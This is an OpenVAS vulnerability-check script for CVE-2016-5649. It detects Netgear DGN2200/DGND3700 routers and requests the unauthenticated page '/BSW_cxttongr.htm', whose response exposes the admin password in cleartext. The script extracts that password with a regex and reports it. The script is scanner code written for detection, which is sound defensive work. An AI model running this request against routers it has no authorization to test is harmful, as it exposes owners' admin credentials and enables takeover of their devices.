##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_cve_2016_5649.nasl 11863 2018-10-12 09:42:02Z mmartin $
#
# Netgear DGN2000, DGND3700 Password Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106497");
  script_version("$Revision: 11863 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:42:02 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-01-06 12:45:06 +0700 (Fri, 06 Jan 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2016-5649");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Netgear DGN2000, DGND3700 Password Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Netgear DGN2200 and DGND3700 are prone to a admin password disclosure
vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a HTTP request and checks the response.");

  script_tag(name:"insight", value:"A vulnerability in the 'BSW_cxttongr.htm' page allows a remote
unauthenticated attacker to access to read the admin password in cleartext.");

  script_tag(name:"impact", value:"An unauthenticated attacker can obtain the admin password.");

  script_tag(name:"affected", value:"Netgear DGN2200 and Netgear DGND3700.");

  script_tag(name:"solution", value:"Update for DGN2200 to firmware version 1.0.0.52 or later and for
DGND3700 to firmware 1.0.0.28 or later.");

  script_xref(name:"URL", value:"https://cxsecurity.com/issue/WLB-2017010027");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 8080);

res = http_get_cache(port: port, item: "/");

if (res !~ 'Basic realm="NETGEAR.DGN(2200|D3700)')
  exit(0);

req =  http_get(port: port, item: "/BSW_cxttongr.htm");
res =  http_keepalive_send_recv(port: port, data: req);

passwd = eregmatch(pattern: '<b>Success "([^"]+)', string: res);
if ("Your wired connection to the Internet is working!" >< res && !isnull(passwd[1])) {
  report = "It was possible to obtain the admin password: " + passwd[1] + "\n";
  report += report_vuln_url(port: port, url: "/BSW_cxttongr.htm");
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
